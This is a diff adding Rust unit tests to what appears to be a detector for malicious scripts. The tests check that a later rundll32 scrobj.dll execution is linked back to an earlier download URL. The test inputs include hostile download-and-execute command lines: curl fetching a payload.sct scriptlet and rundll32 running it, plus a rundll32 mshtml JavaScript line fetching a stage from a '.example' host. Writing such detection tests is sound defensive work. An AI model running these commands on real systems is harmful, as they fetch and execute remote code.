@@ -8766,6 +8766,28 @@ mshta payload.hta"#,
     }
 
     #[test]
+    fn rundll32_scrobj_local_target_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o payload.sct https://rundll32-scrobj-local.example/payload.sct
+rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"
+                        && url == "https://rundll32-scrobj-local.example/payload.sct"
+            )
+        });
+        assert!(
+            has,
+            "rundll32 scrobj local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_mshtml_inline_javascript_url_is_scanned() {
         let script = br#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";fetch("https://rundll32-mshtml-js.example/stage")"#;
         let report = crate::analyze(script, &Config::default());
@@ -15096,6 +15118,33 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn rundll32_scrobj_downloaded_target_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o payload.sct https://rundll32-scrobj-deob-local.example/payload.sct"
+                .to_string(),
+            src: "https://rundll32-scrobj-deob-local.example/payload.sct".to_string(),
+            dst: Some("payload.sct".to_string()),
+        });
+        crate::deob_scan::scan_deob_text(
+            "rundll32.exe scrobj.dll,GenerateTypeLib payload.sct",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"
+                            && url == "https://rundll32-scrobj-deob-local.example/payload.sct"
+                )
+            }),
+            "rundll32 scrobj downloaded target in deob text was not typed: {:?}",
+            env.traits
+        );
     }
 
     #[test]
